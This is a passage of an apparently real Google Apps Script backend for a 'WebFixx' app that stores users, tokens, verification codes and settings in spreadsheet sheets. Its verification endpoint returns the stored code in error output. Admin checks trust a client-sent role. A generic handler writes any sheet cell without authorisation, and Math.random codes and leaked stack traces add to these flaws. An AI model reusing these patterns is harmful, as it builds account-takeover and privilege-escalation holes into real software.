      const tokenColumnIndex = headers.indexOf("tokens");
      
      if (tokenColumnIndex === -1) {
        return createJsonResponse({
          success: false,
          error: "Tokens column not found",
          debug: { availableColumns: headers }
        });
      }

      let tokens = [];
      try {
        const rawTokens = userRow.data[0][tokenColumnIndex];
        tokens = JSON.parse(rawTokens || "[]");
        Logger.log("Current tokens:", tokens.length);
      } catch (e) {
        Logger.log("Error parsing tokens:", e);
        tokens = [];
      }

      // Remove expired tokens and the logout token
      const now = new Date();
      tokens = tokens.filter(t => {
        const isExpired = new Date(t.expiresAt) < now;
        const isLogoutToken = t.token === token;
        return !isExpired && !isLogoutToken;
      });

      Logger.log("Remaining valid tokens:", tokens.length);

      // Update tokens in sheet
      userSheet.getRange(userRow.rowIndex, tokenColumnIndex + 1)
        .setValue(JSON.stringify(tokens));

      return createJsonResponse({
        success: true,
        message: "Logged out successfully",
        debug: {
          tokensRemoved: true,
          remainingTokens: tokens.length
        }
      });

    } catch (sheetError) {
      Logger.log("Sheet operation error:", sheetError);
      return createJsonResponse({
        success: false,
        error: "Failed to update tokens",
        debug: {
          errorMessage: sheetError.message,
          stack: sheetError.stack
        }
      });
    }

  } catch (error) {
    Logger.log("Logout error:", error);
    return createJsonResponse({
      success: false,
      error: "Logout failed",
      debug: {
        errorMessage: error.message,
        stack: error.stack,
        params: JSON.stringify(params)
      }
    });
  }
}

function sendVerificationEmail(params) {
  try {
    Logger.log("Starting send verification email with params:", params);
    const { userEmail } = params;
    
    if (!userEmail) {
      return { 
        success: false, 
        error: "Email is required" 
      };
    }

    // Get user data using email
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      return { 
        success: false, 
        error: "User sheet not found" 
      };
    }

    // Get all data at once
    const data = userSheet.getDataRange().getValues();
    const headers = data[0];
    const emailColIndex = headers.indexOf("email");
    const verifyCodeColIndex = headers.indexOf("verifyCode");

    if (emailColIndex === -1 || verifyCodeColIndex === -1) {
      return {
        success: false,
        error: "Required columns not found",
        debug: { headers }
      };
    }

    // Find user row
    const userRowIndex = data.findIndex(row => row[emailColIndex] === userEmail);
    if (userRowIndex === -1) {
      return {
        success: false,
        error: "User not found",
        debug: { email: userEmail }
      };
    }

    // Generate verification code
    const verificationCode = Math.random().toString(36).substring(2, 8).toUpperCase();
    
    try {
      // Update verification code - using 1-based indices
      userSheet.getRange(userRowIndex + 1, verifyCodeColIndex + 1)
        .setValue(verificationCode);
    } catch (e) {
      Logger.log("Error updating verification code:", e);
      return {
        success: false,
        error: "Failed to save verification code",
        debug: {
          rowIndex: userRowIndex + 1,
          colIndex: verifyCodeColIndex + 1,
          error: e.message
        }
      };
    }

    // Send email
    try {
      const emailTemplate = HtmlService.createTemplateFromFile('verification_email');
      emailTemplate.code = verificationCode;
      emailTemplate.username = data[userRowIndex][headers.indexOf("username")];
      
      const htmlBody = emailTemplate.evaluate().getContent();

      GmailApp.sendEmail(
        userEmail,
        "Verify Your WebFixx Account",
        `Your verification code is: ${verificationCode}`,
        {
          htmlBody: htmlBody,
          name: "WebFixx Support"
        }
      );

      return {
        success: true,
        message: "Verification email sent successfully"
      };

    } catch (e) {
      Logger.log("Error sending email:", e);
      return {
        success: false,
        error: "Failed to send email",
        debug: { error: e.message }
      };
    }

  } catch (error) {
    Logger.log("Send verification email error:", error);
    return {
      success: false,
      error: error.message,
      debug: {
        stack: error.stack,
        params: JSON.stringify(params)
      }
    };
  }
}

function verifyAccount(params) {
  try {
    Logger.log("Starting account verification with params:", params);
    const { code, userEmail } = params;
    
    // Validate inputs
    if (!code || !userEmail) {
      return {
        success: false,
        error: "Verification code and email are required",
        debug: { providedParams: params }
      };
    }

    // Get spreadsheet and validate
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      return {
        success: false,
        error: "User sheet not found"
      };
    }

    // Get all data at once
    const data = userSheet.getDataRange().getValues();
    const headers = data[0];
    
    // Find required column indices
    const emailColIndex = headers.indexOf("email");
    const verifyCodeColIndex = headers.indexOf("verifyCode");
    const verifyStatusColIndex = headers.indexOf("verifyStatus");

    if (emailColIndex === -1 || verifyCodeColIndex === -1 || verifyStatusColIndex === -1) {
      return {
        success: false,
        error: "Required columns not found",
        debug: {
          availableColumns: headers,
          required: ["email", "verifyCode", "verifyStatus"]
        }
      };
    }

    // Find user row
    const userRowIndex = data.findIndex(row => row[emailColIndex] === userEmail);
    if (userRowIndex === -1) {
      return {
        success: false,
        error: "User not found",
        debug: { searchedEmail: userEmail }
      };
    }

    // Get stored verification code
    const storedCode = data[userRowIndex][verifyCodeColIndex];
    Logger.log("Stored code:", storedCode);
    Logger.log("Provided code:", code);

    if (!storedCode) {
      return {
        success: false,
        error: "No verification code found. Please request a new one.",
        debug: { userRowIndex: userRowIndex + 1 }
      };
    }

    // Compare codes (case insensitive)
    if (code.toUpperCase() !== storedCode.toString().toUpperCase()) {
      return {
        success: false,
        error: "Invalid verification code",
        debug: {
          provided: code.toUpperCase(),
          stored: storedCode.toString().toUpperCase()
        }
      };
    }

    try {
      // Update verification status - using 1-based indices
      const actualRow = userRowIndex + 1;
      
      // Update status
      userSheet.getRange(actualRow, verifyStatusColIndex + 1)
        .setValue("TRUE");
      
      // Clear verification code
      userSheet.getRange(actualRow, verifyCodeColIndex + 1)
        .setValue("");

      Logger.log("Successfully updated user verification status");
      
      return {
        success: true,
        message: "Account verified successfully"
      };

    } catch (e) {
      Logger.log("Error updating sheet:", e);
      return {
        success: false,
        error: "Failed to update verification status",
        debug: {
          error: e.message,
          rowIndex: userRowIndex + 1,
          statusColIndex: verifyStatusColIndex + 1,
          codeColIndex: verifyCodeColIndex + 1
        }
      };
    }

  } catch (error) {
    Logger.log("Verification error:", error);
    return {
      success: false,
      error: "Verification failed",
      debug: {
        errorMessage: error.message,
        errorStack: error.stack,
        params: JSON.stringify(params)
      }
    };
  }
}


function updateAppData(params) {
  const startTime = Date.now();
  try {
    const userId = params.userId;
    const userRole = params.userRole;

    // Get user data
    const userData = userRole === "ADMIN" ? getAdminData(userId) : getUserData(userId);
    
    // Get user details from user sheet
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    const headers = userSheet.getRange(1, 1, 1, userSheet.getLastColumn()).getValues()[0];
    const rows = userSheet.getDataRange().getValues();
    
    // Find user row
    const userIdIndex = headers.indexOf("userId");
    const userRowIndex = rows.findIndex((row, index) => index > 0 && row[userIdIndex] === userId);
    
    if (userRowIndex === -1) {
      throw new Error("User not found");
    }

    const user = rows[userRowIndex];

    // Format user response
    const userResponse = {
      id: userId,
      userId: userId,
      email: user[headers.indexOf("email")],
      username: user[headers.indexOf("username")],
      role: userRole,
      verifyStatus: user[headers.indexOf("verifyStatus")] || "FALSE",
      darkMode: user[headers.indexOf("darkMode")] || "FALSE",
      twoFactorAuth: user[headers.indexOf("twoFactorAuth")] || "FALSE",
      autoVerifySessions: user[headers.indexOf("autoVerifySessions")] || "FALSE",
      verificationIntervalHours: parseInt(user[headers.indexOf("verificationIntervalHours")]) || 1,
      balance: user[headers.indexOf("balance")] || "0.00",
      plan: user[headers.indexOf("plan")] || "FREE",
      planExpiry: user[headers.indexOf("planExpiry")] || ""
    };

    Logger.log(`[updateAppData] completed in ${Date.now() - startTime}ms`);
    return {
      success: true,
      user: userResponse,
      data: userData,
      needsVerification: userResponse.verifyStatus === "FALSE" || !userResponse.verifyStatus
    };

  } catch (error) {
    Logger.log(`[updateAppData] failed in ${Date.now() - startTime}ms: ${error.message}`);
    return { 
      success: false, 
      error: error.message || "Failed to update app data" 
    };
  }
}

/**
 * Lightweight variant of updateAppData used by the web dashboard.
 * Returns the SAME shape (success/user/data/needsVerification) but the projects
 * table carries only light file pointers ({fileId, downloadUrl, count, filePointer})
 * instead of the full inline response payload. The frontend lazily fetches a single
 * project's responses on demand via getProjectResponses.
 */
function getAppDataLite(params) {
  const startTime = Date.now();
  try {
    const userId = params.userId;
    const userRole = params.userRole;

    const userData = userRole === "ADMIN" ? getAdminData(userId, true) : getUserData(userId, true);

    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    const headers = userSheet.getRange(1, 1, 1, userSheet.getLastColumn()).getValues()[0];
    const rows = userSheet.getDataRange().getValues();

    const userIdIndex = headers.indexOf("userId");
    const userRowIndex = rows.findIndex((row, index) => index > 0 && row[userIdIndex] === userId);

    if (userRowIndex === -1) {
      throw new Error("User not found");
    }

    const user = rows[userRowIndex];

    const userResponse = {
      id: userId,
      userId: userId,
      email: user[headers.indexOf("email")],
      username: user[headers.indexOf("username")],
      role: userRole,
      verifyStatus: user[headers.indexOf("verifyStatus")] || "FALSE",
      darkMode: user[headers.indexOf("darkMode")] || "FALSE",
      twoFactorAuth: user[headers.indexOf("twoFactorAuth")] || "FALSE",
      autoVerifySessions: user[headers.indexOf("autoVerifySessions")] || "FALSE",
      verificationIntervalHours: parseInt(user[headers.indexOf("verificationIntervalHours")]) || 1,
      balance: user[headers.indexOf("balance")] || "0.00",
      plan: user[headers.indexOf("plan")] || "FREE",
      planExpiry: user[headers.indexOf("planExpiry")] || ""
    };

    Logger.log(`[getAppDataLite] completed in ${Date.now() - startTime}ms`);
    return {
      success: true,
      user: userResponse,
      data: userData,
      needsVerification: userResponse.verifyStatus === "FALSE" || !userResponse.verifyStatus
    };

  } catch (error) {
    Logger.log(`[getAppDataLite] failed in ${Date.now() - startTime}ms: ${error.message}`);
    return {
      success: false,
      error: error.message || "Failed to load app data"
    };
  }
}

/**
 * Update a settings row's value (ADMIN ONLY).
 * @param {Object} params - { userId, userRole, key, value1, value2 }
 * @returns {Object} Result object
 */
function updateSetting(params) {
  try {
    Logger.log(`[updateSetting] called with params: ${JSON.stringify({ settingsKey: params.settingsKey, value1: params.value1, value2: params.value2, userRole: params.userRole, userId: params.userId })}`);
    if (params.userRole !== "ADMIN") {
      Logger.log(`[updateSetting] BLOCKED: userRole=${params.userRole} is not ADMIN`);
      return { success: false, error: "ADMIN role required to update settings" };
    }

    const key = params.settingsKey;
    if (!key) {
      return { success: false, error: "settingsKey is required" };
    }

    const headerAndValueMap = {};
    if (typeof params.value1 !== 'undefined') headerAndValueMap.settingsValue1 = params.value1;
    if (typeof params.value2 !== 'undefined') headerAndValueMap.settingsValue2 = params.value2;

    if (Object.keys(headerAndValueMap).length === 0) {
      return { success: false, error: "At least one of value1 or value2 is required" };
    }

    const result = setMultipleCellDataByColumnSearch("settings", "settingsKey", key, headerAndValueMap);

    if (!result.success) {
      Logger.log(`[updateSetting] WRITE FAILED for '${key}': ${result.error}`);
      return { success: false, error: result.error };
    }

    // Self-verify: re-read the written row from the sheet
    const verified = {};
    try {
      const ss = SpreadsheetApp.getActiveSpreadsheet();
      const ws = ss.getSheetByName("settings");
      const [headers, ...rows] = ws.getDataRange().getValues();
      const keyCol = headers.indexOf("settingsKey");
      const rowIndex = rows.findIndex(r => r[keyCol].toString().trim() === key.toString().trim());
      if (rowIndex !== -1) {
        headers.forEach((h, i) => { verified[h] = rows[rowIndex][i]; });
      }
    } catch (verifyError) {
      Logger.log(`[updateSetting] verification read failed: ${verifyError.message}`);
    }

    Logger.log(`[updateSetting] Updated '${key}' at row ${result.rowNumber}: ${JSON.stringify(headerAndValueMap)} | sheet now: ${JSON.stringify(verified)}`);
    return { success: true, message: `Setting '${key}' updated successfully`, rowNumber: result.rowNumber, verified: verified };
  } catch (error) {
    Logger.log(`[updateSetting] failed: ${error.message}`);
    return { success: false, error: error.message };
  }
}

function updateUserPreferences(params) {
  try {
    Logger.log("Updating user preferences with params:", params);
    const { userId, darkMode } = params;

    if (!userId || typeof darkMode === 'undefined') {
      return {
        success: false,
        error: "userId and darkMode are required parameters."
      };
    }

    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      return {
        success: false,
        error: "User sheet not found."
      };
    }

    const data = userSheet.getDataRange().getValues();
    const headers = data[0];
    const userIdColIndex = headers.indexOf("userId");
    const darkModeColIndex = headers.indexOf("darkMode");

    if (userIdColIndex === -1 || darkModeColIndex === -1) {
      return {
        success: false,
        error: "Required columns (userId, darkMode) not found in user sheet."
      };
    }

    const userRowIndex = data.findIndex(row => row[userIdColIndex] === userId);
    if (userRowIndex === -1) {
      return {
        success: false,
        error: "User not found."
      };
    }

    // Update darkMode status (convert boolean to string "TRUE" or "FALSE")
    userSheet.getRange(userRowIndex + 1, darkModeColIndex + 1).setValue(darkMode ? "TRUE" : "FALSE");

    return {
      success: true,
      message: "User preferences updated successfully.",
      darkMode: darkMode
    };

  } catch (error) {
    Logger.log("Error updating user preferences:", error);
    return {
      success: false,
      error: error.message || "Failed to update user preferences."
    };
  }
}

/**
 * Generic handler for updating multiple cells in a sheet by column search.
 * Used as App Script fallback when Sheets API fails.
 */
function handleSetMultipleCellData(params) {
  try {
    const { sheetName, searchColumn, searchValue, data } = params;
    if (!sheetName || !searchColumn || !searchValue || !data) {
      return createJsonResponse({ success: false, error: "Missing required params: sheetName, searchColumn, searchValue, data" });
    }
    const parsedData = typeof data === 'string' ? JSON.parse(data) : data;
    const result = setMultipleCellDataByColumnSearch(sheetName, searchColumn, searchValue, parsedData);
    return createJsonResponse(result);
  } catch (error) {
    Logger.log("Error in handleSetMultipleCellData: " + error.message);
    return createJsonResponse({ success: false, error: error.message });
  }
}


